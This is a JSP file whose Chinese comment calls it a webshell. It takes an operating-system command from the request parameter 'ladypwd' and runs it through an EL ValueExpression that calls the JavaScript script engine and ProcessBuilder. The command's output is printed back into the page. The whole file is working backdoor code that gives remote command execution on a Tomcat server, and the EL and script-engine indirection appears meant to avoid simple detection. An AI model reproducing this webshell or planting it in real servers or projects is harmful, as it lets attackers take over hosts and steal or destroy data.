<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="javax.el.ELManager" %>
<%@ page import="javax.el.ValueExpression" %>
<%@ page import="javax.el.ELContext" %>
<%@ page import="javax.el.ExpressionFactory" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
利用Tomcat的ELProcessor#eval()的底层实现ExpressionFactory#createValueExpression() 去实现JSP Webshell
--%>
<%
    StringBuilder sb = new StringBuilder();
    String cmd = request.getParameter("ladypwd");
    for (String tmp:cmd.split(" ")) {
        sb.append("'").append(tmp).append("'").append(",");
    }
    String f = sb.substring(0, sb.length() - 1);
    String expr = "" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\")." +
            "eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")";
    ELManager elManager = new ELManager();
    ELContext elCtx = elManager.getELContext();
    ValueExpression ve = ELManager.getExpressionFactory().createValueExpression(elCtx, "${" + expr + "}", Object.class);
    Process p = (Process)ve.getValue(elCtx);
    InputStream is = p.getInputStream();
    sb = new StringBuilder();
    BufferedReader br = new BufferedReader(new InputStreamReader(is));
    String line;
    while((line = br.readLine()) != null) {
        sb.append(line).append("\n");
    }
    out.print("<pre>");
    if (sb.length() > 0) {
        out.print(sb.toString());
    }
    out.print("</pre>");
%>
